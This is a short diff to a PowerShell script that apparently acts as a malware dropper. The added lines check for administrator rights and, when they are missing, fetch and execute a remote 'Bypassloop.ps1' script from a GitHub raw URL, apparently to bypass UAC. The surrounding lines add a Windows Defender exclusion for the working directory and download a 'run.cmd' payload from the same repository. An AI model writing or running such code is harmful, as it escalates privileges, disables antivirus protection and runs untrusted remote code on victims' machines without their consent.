@@ -3,6 +3,11 @@ New-Item -ItemType Directory -Path $dir
 
 $temp = "$dir\temp"
 New-Item -ItemType Directory -Path $temp
+
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Bypassloop.ps1" -useb)
+}
+
 Add-MpPreference -ExclusionPath $dir
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"
